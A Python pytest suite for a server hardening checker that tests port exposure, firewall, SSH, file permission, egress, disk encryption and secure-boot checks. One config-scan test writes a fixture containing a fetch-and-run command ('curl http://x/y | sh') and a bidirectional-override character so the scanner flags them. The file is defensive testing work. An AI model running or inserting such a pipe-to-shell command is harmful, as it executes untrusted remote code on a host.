from __future__ import annotations

from app import doctor
from app.doctor import FAIL, PASS, WARN


def fake(outputs: dict[str, tuple[int, str]]):
    def sh(cmd):
        return outputs.get(" ".join(cmd), (1, ""))

    return sh


def status_of(results, name_part):
    return next(r.status for r in results if name_part in r.name)


def test_parse_listening_ipv4_ipv6():
    out = "LISTEN 0 128 0.0.0.0:22 0.0.0.0:*\nLISTEN 0 4096 127.0.0.1:8080 0.0.0.0:*\nLISTEN 0 128 [::]:22 [::]:*\n"
    assert doctor.parse_listening(out) == [("0.0.0.0", 22), ("127.0.0.1", 8080), ("::", 22)]


def test_ports_fail_when_service_exposed():
    bad = fake({"ss -ltnH": (0, "LISTEN 0 1 0.0.0.0:11434 0.0.0.0:*\nLISTEN 0 1 0.0.0.0:22 0.0.0.0:*\n")})
    good = fake({"ss -ltnH": (0, "LISTEN 0 1 0.0.0.0:22 0.0.0.0:*\nLISTEN 0 1 127.0.0.1:11434 0.0.0.0:*\nLISTEN 0 1 100.64.0.5:443 0.0.0.0:*\n")})
    assert doctor.check_ports(bad)[0].status == FAIL and "11434" in doctor.check_ports(bad)[0].detail
    assert doctor.check_ports(good)[0].status == PASS


def test_firewall_states():
    assert doctor.check_firewall(fake({"ufw status verbose": (0, "Status: inactive")}))[0].status == FAIL
    ok = "Status: active\nDefault: deny (incoming), allow (outgoing)"
    assert doctor.check_firewall(fake({"ufw status verbose": (0, ok)}))[0].status == PASS
    open_in = "Status: active\nDefault: allow (incoming), allow (outgoing)"
    assert doctor.check_firewall(fake({"ufw status verbose": (0, open_in)}))[0].status == FAIL


def test_ssh_checks():
    weak = fake({"sshd -T": (0, "passwordauthentication yes\npermitrootlogin yes\n")})
    res = doctor.check_ssh(weak)
    assert [r.status for r in res] == [WARN, FAIL]
    strong = fake({"sshd -T": (0, "passwordauthentication no\npermitrootlogin prohibit-password\n")})
    assert [r.status for r in doctor.check_ssh(strong)] == [PASS, PASS]


def test_file_permissions(tmp_path):
    env = tmp_path / "edge.env"
    env.write_text("x")
    env.chmod(0o644)
    state = tmp_path / "state"
    state.mkdir()
    state.chmod(0o755)
    (state / "tokens.json").write_text("{}")
    (state / "tokens.json").chmod(0o644)
    res = doctor.check_files(env, state)
    assert [r.status for r in res] == [FAIL, FAIL, FAIL]
    env.chmod(0o640)
    state.chmod(0o700)
    (state / "tokens.json").chmod(0o600)
    assert all(r.status == PASS for r in doctor.check_files(env, state))


def test_ollama_egress(tmp_path):
    p = tmp_path / "egress.conf"
    assert doctor.check_ollama_egress(p)[0].status == WARN
    p.write_text("[Service]\nIPAddressDeny=any\n")
    assert doctor.check_ollama_egress(p)[0].status == PASS


def test_luks_and_boot(tmp_path):
    assert doctor.check_disk_encryption(fake({"lsblk -no TYPE": (0, "disk\npart\ncrypt\n")}))[0].status == PASS
    assert doctor.check_disk_encryption(fake({"lsblk -no TYPE": (0, "disk\npart\n")}))[0].status == WARN
    (tmp_path / "tpmrm0").write_text("")
    res = doctor.check_boot_security(fake({"mokutil --sb-state": (0, "SecureBoot enabled")}), tmp_path)
    assert [r.status for r in res] == [PASS, PASS]


def test_exit_code_and_render():
    r = [doctor.Result(PASS, "a"), doctor.Result(WARN, "b", "x", "napraw")]
    assert doctor.exit_code(r) == 2 and "napraw" in doctor.render(r)
    assert doctor.exit_code([doctor.Result(FAIL, "c")]) == 1
    assert doctor.exit_code([doctor.Result(PASS, "d")]) == 0


def test_config_scan(tmp_path):
    from app.doctor import check_config_scan, scan_config
    clean = tmp_path / "a.service"
    clean.write_text("[Service]\nExecStart=/bin/true\n")
    assert check_config_scan([tmp_path])[0].status == "PASS"
    (tmp_path / "b.conf").write_text("x\u202ey\n")
    (tmp_path / "c.sh").write_text("curl http://x/y | sh\n")
    found = scan_config([tmp_path])
    assert len(found) == 2
    assert check_config_scan([tmp_path])[0].status == "FAIL"


def test_deep_without_tools(monkeypatch):
    import app.doctor as d
    monkeypatch.setattr(d.shutil, "which", lambda _n: None)
    res = d.check_deep(lambda _c: (0, ""))
    assert [r.status for r in res] == ["WARN", "WARN"]


def test_deep_with_tools(monkeypatch):
    import app.doctor as d
    monkeypatch.setattr(d.shutil, "which", lambda n: "/usr/bin/" + n)
    def sh(cmd):
        return (0, "(kex) x [fail] bad\n") if cmd[0] == "ssh-audit" else (0, "Hardening index : 82 [####]")
    res = d.check_deep(sh)
    assert res[0].status == "FAIL" and res[1].status == "PASS"
